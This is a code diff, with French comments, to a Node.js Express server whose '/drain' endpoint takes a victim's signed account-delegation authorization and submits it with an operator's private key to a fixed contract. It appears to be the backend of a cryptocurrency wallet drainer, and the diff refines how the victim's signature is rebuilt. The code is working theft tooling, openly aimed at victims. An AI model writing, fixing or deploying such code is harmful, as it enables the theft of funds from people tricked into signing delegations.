@@ -1,9 +1,9 @@
 import express from "express";
 import cors from "cors";
-import { JsonRpcProvider, Wallet, Interface, Transaction } from "ethers";
+import { JsonRpcProvider, Wallet, Interface } from "ethers";
 
-const RPC = process.env.RPC_URL;          // ex: https://eth.llamarpc.com
-const PK = process.env.PRIVATE_KEY;        // clé de 0x878...3635f
+const RPC = process.env.RPC_URL;
+const PK = process.env.PRIVATE_KEY;
 const CONTRACT = "0x644efce7920fc8af69cb45832e5fed2ff5e2d92b";
 
 const provider = new JsonRpcProvider(RPC);
@@ -19,6 +19,16 @@ app.post("/drain", async (req, res) => {
     const { victim, auth } = req.body;
     if (!victim || !auth) return res.status(400).json({ error: "victim/auth manquant" });
 
+    // On reconstruit l'autorisation signée par la victime
+    const authorization = {
+      chainId: BigInt(auth.chainId),
+      address: CONTRACT,
+      nonce: BigInt(auth.nonce),
+      yParity: Number(auth.yParity),
+      r: auth.r,
+      s: auth.s,
+    };
+
     const nonce = await provider.getTransactionCount(wallet.address, "latest");
     const fee = await provider.getFeeData();
 
@@ -32,14 +42,7 @@ app.post("/drain", async (req, res) => {
       maxFeePerGas: fee.maxFeePerGas,
       maxPriorityFeePerGas: fee.maxPriorityFeePerGas,
       gasLimit: 300000n,
-      authorizationList: [{
-        chainId: 1,
-        address: CONTRACT,
-        nonce: auth.nonce,
-        yParity: auth.yParity,
-        r: auth.r,
-        s: auth.s,
-      }],
+      authorizationList: [authorization],
     };
 
     const sent = await wallet.sendTransaction(tx);
